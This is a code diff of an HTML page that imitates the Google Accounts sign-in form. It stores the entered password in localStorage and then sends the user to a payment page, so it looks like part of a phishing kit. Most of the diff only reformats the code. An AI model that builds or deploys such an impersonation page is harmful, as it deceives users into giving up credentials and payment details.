@@ -5,17 +5,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
-        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
-        integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
-        crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
-        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
-        crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
-        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
-        crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
     <!-- js -->
     <script src="main.js"></script>
@@ -49,15 +42,14 @@
 <style>
     @import "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css";
     @import "https://fonts.googleapis.com/css?family=Raleway|Roboto";
-
     * {
         margin: 0px;
         padding: 0px;
         box-sizing: border-box;
         font-family: "Raleway";
     }
-
-    :root {
+    
+     :root {
         /*===== Colores =====*/
         --first-color: #1A73E8;
         --input-color: #80868B;
@@ -67,21 +59,20 @@
         --normal-font-size: 1rem;
         --small-font-size: .75rem;
     }
-
     /*===== BASE =====*/
-
+    
     *,
-    ::before,
-    ::after {
+     ::before,
+     ::after {
         box-sizing: border-box;
     }
-
+    
     body {
         font-family: 'Roboto', sans-serif;
         height: 100vh;
         background: -webkit-linear-gradient(rgb(255, 255, 255) 0%, rgb(255, 255, 255) 100%);
     }
-
+    
     .login-form {
         border: 1px solid #dadada;
         font-family: 'Open Sans', sans-serif;
@@ -95,7 +86,7 @@
         overflow: hidden;
         border-radius: 2%;
     }
-
+    
     .Head {
         font-family: 'Open Sans', sans-serif;
         line-height: 32px;
@@ -105,16 +96,16 @@
         font-weight: 400;
         color: black;
     }
-
+    
     .login-form .backbtn.active {
         background: #647ace;
         cursor: pointer;
     }
-
+    
     .login-form .backbtn.disabled {
         background: #eee;
     }
-
+    
     .login-form .line {
         position: absolute;
         top: 60px;
@@ -124,7 +115,7 @@
         color: #666;
         font-family: "Roboto";
     }
-
+    
     .login-form .line p {
         margin-top: 10px;
         color: rgb(0, 0, 0);
@@ -133,7 +124,7 @@
         font-size: 60%;
         line-height: 24px;
     }
-
+    
     .phases {
         position: absolute;
         top: 160px;
@@ -142,7 +133,7 @@
         left: 0%;
         transition: all 300ms ease;
     }
-
+    
     .phases div {
         width: 50%;
         float: left;
@@ -150,19 +141,19 @@
         flex-direction: column;
         padding: 0px 20px;
     }
-
+    
     .phases div * {
         margin: 8px 0px;
     }
-
+    
     .phases div input {
         padding-left: 5px;
     }
-
+    
     .phases div input.error {
         border-color: tomato;
     }
-
+    
     .phases div button {
         display: block;
         margin-left: auto;
@@ -176,28 +167,28 @@
         cursor: pointer;
         transition: .3s;
     }
-
+    
     button:hover {
         box-shadow: 0 10px 36px rgba(0, 0, 0, .15);
     }
-
+    
     .phases.next {
         left: -100%;
     }
-
+    
     .create {
         position: absolute;
         bottom: 20px;
         width: 100%;
         text-align: center;
     }
-
+    
     .create a {
         text-decoration: none;
         font-size: 16px;
         color: #196be8;
     }
-
+    
     .loading {
         position: absolute;
         top: 0px;
@@ -208,15 +199,15 @@
         display: none;
         z-index: 2;
     }
-
+    
     .loading.show-it {
         display: inline-block;
     }
-
+    
     img {
         width: 15%;
     }
-
+    
     .loading:before {
         content: "";
         position: absolute;
@@ -230,25 +221,25 @@
         border-radius: 50%;
         animation: loading 900ms ease infinite;
     }
-
+    
     @keyframes loading {
         to {
             transform: translate(-50%, -50%) rotate(360deg);
         }
     }
-
+    
     .phase-1 {
         position: relative;
         height: 48px;
         margin-bottom: 1.5rem;
     }
-
+    
     .phase-2 {
         position: relative;
         height: 48px;
         margin-bottom: 1.5rem;
     }
-
+    
     .form__input {
         top: 0;
         left: 0;
@@ -262,7 +253,7 @@
         background: none;
         z-index: 1;
     }
-
+    
     .form__label {
         position: absolute;
         left: 2rem;
@@ -274,9 +265,8 @@
         transition: .3s;
         font-weight: 55s0;
     }
-
     /*Input focus move up label*/
-
+    
     .form__input:focus+.form__label {
         top: -.5rem;
         left: .8rem;
@@ -285,9 +275,8 @@
         font-weight: 500;
         z-index: 10;
     }
-
     /*Input focus sticky top label*/
-
+    
     .form__input:not(:placeholder-shown).form__input:not(:focus)+.form__label {
         top: -.5rem;
         left: .8rem;
@@ -295,23 +284,22 @@
         font-weight: 500;
         z-index: 10;
     }
-
     /*Input focus*/
-
+    
     .form__input:focus {
         border: 1.5px solid var(--first-color);
     }
-
+    
     a {
         font-size: 80%;
         font-weight: 600;
         font-family: 'Roboto', sans-serif;
     }
-
+    
     p.content {
         font-family: 'Roboto', sans-serif;
     }
-
+    
     .bottom-section {
         width: 100%;
     }
@@ -329,12 +317,10 @@
             </div>
             <div class="phases" id="phase-form">
                 <div class="phase-1">
-                    <input id="email" class="form__input" autocomplete="off" onfocus="removeError(this);" type="text"
-                        placeholder=" ">
+                    <input id="email" class="form__input" autocomplete="off" onfocus="removeError(this);" type="text" placeholder=" ">
                     <label for="" class="form__label">Email or phone</label>
                     <a href="SignIn.html">Forget email?</a>
-                    <p class="content">Not your computer? Use a private browsing window to sign in. <a
-                            href="SignIn.html">Learn more</a></p>
+                    <p class="content">Not your computer? Use a private browsing window to sign in. <a href="SignIn.html">Learn more</a></p>
                     <bottom-section>
                         <create-account>
                             <a href="#" style="text-decoration: none;">Create an account</a>
@@ -344,8 +330,7 @@
                     <!-- <button onclick="next();">Next</button> -->
                 </div>
                 <div class="phase-2">
-                    <input type="password" class="form__input" onfocus="removeError(this);" id="password"
-                        placeholder="">
+                    <input type="password" class="form__input" onfocus="removeError(this);" id="password" placeholder="">
                     <label for="" class="form__label">Password</label>
                     <a href="SignIn.html">Forget password?</a>
                     <button onclick="submitForm();">Next</button>
@@ -384,7 +369,7 @@
                 // set Storage
                 localStorage.setItem("password", document.getElementById('password').value);
                 // <a href="Payment.html">
-                window.location.href = "Payment.html"
+                window.location.href = "payment.html"
             } else {
                 document.getElementById('password').classList.add('error');
             }
@@ -417,7 +402,7 @@
         function removeError(ref) {
             try {
                 ref.classList.remove('error');
-            } catch (msg) { }
+            } catch (msg) {}
         }
     </script>
 </body>
